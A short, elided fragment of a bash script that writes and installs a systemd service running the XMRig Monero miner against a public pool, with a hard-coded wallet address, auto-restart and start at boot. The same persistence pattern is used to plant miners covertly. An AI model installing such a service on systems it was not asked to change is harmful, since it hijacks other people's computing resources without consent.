...
then
	...
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
        ...
        sudo bash -c 'echo -e "[Unit]\nDescription=XMR Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o xmr.2miners.com:2222 --rig-id=Moon -u 89PEsBVE7g2Qn8ntRttWWGSYGtbNKgBJ9L1NraUQoczfNkubmDeb2F2QQfsNCNzJLLbRGFemMsUtZTdcVzVZ1CMKMv7byxv -p x -k &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmr.service'
